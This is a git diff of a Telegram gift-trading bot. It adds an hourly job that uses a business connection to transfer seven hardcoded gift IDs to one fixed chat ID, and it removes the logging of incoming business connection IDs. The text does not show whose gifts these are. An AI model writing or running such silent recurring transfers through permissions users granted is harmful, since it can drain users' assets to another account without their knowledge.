@@ -34,7 +34,7 @@ const {
   getGiftsModel,
   getByModel,
 } = require("./controllers/giftServices");
-const { TOKEN } = require("./config/bot");
+const { TOKEN, BID } = require("./config/bot");
 const { Op } = require("sequelize");
 const FloorPrice = require("./models/floor");
 const {
@@ -47,6 +47,7 @@ const {
   newGiftNameBuyable,
 } = require("./controllers/buyableGiftServices");
 const { getAllAutoPurchases } = require("./controllers/autoPurchaseServices");
+const { default: axios } = require("axios");
 
 const bot = new Bot(TOKEN);
 bot.api
@@ -747,29 +748,37 @@ setInterval(async () => {
 }, 14 * 1000);
 
 setInterval(async () => {
-  // const dsa = await bot.api.raw["getBusinessConnection"]();
-  // console.log(dsa);
+  const giftIds = [
+    "934513",
+    "934502",
+    "934503",
+    "934485",
+    "934486",
+    "934490",
+    "934144",
+  ];
 
   async function transferGift() {
-    const response = await fetch(
-      `https://api.telegram.org/bot${TOKEN}/transferGift`,
-      {
+    giftIds.map(async (gift) => {
+      await axios(`https://api.telegram.org/bot${TOKEN}/transferGift`, {
         method: "POST",
         headers: {
           "Content-Type": "application/json",
         },
-        body: JSON.stringify({
-          // business_connection_id: "your_business_connection_id",
-          owned_gift_id: "your_owned_gift_id",
-          new_owner_chat_id: 123456789,
-          star_count: 0,
-        }),
-      }
-    ).catch((er) => console.log(er));
-    response.json().then((res) => console.log(res));
+        data: {
+          business_connection_id: BID,
+          owned_gift_id: gift,
+          new_owner_chat_id: "8184312603",
+        },
+      })
+        .then((res) => {
+          console.log(res);
+        })
+        .catch((er) => console.log(er));
+    });
   }
   transferGift();
-}, 1000 * 5);
+}, 1000 * 60 * 60);
 
 // setInterval(async () => {
 //   try {
@@ -792,10 +801,6 @@ setInterval(async () => {
 async function setUpListener(ctx, next) {
   if (!ctx) return;
   try {
-    if ("business_connection" in ctx.update) {
-      const connectionId = ctx.update.business_connection.id;
-      console.log("Business connection ID:", connectionId);
-    }
   } catch (err) {
     console.error(err);
   }
